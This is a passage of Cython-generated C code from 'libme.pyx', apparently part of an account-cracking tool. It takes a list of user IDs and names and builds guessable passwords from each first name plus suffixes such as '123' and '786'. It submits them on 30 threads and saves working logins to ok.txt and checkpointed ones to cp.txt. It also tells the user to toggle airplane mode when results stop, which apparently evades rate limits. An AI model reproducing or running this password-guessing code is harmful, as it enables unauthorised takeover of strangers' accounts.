 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 912, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 912, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 912, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 912, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 912, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 912, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 912, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":913
 * 		elif ask == "t":
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 913, __pyx_L37_error)

            /* "libme.pyx":914
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 914, __pyx_L37_error)

            /* "libme.pyx":915
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 915, __pyx_L37_error)

            /* "libme.pyx":916
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 916, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 916, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 916, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 916, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 916, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 916, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 916, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 916, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":917
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 917, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 917, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 917, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 917, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 917, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 917, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 917, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 917, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":918
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 918, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_4, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 918, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 918, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":919
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 919, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":920
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 920, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 920, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 920, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 920, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 920, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;

                /* "libme.pyx":919
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":921
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 921, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 921, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 921, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":922
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 922, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 922, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 922, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 922, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 922, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":921
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":924
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 924, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 924, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 924, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 924, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 924, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":925
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __ma___sal2__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 925, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 925, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 925, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 925, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 925, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_4 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 925, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":916
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":912
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 				with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__100__00__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_9) < 0) __PYX_ERR(0, 912, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 912, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 912, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
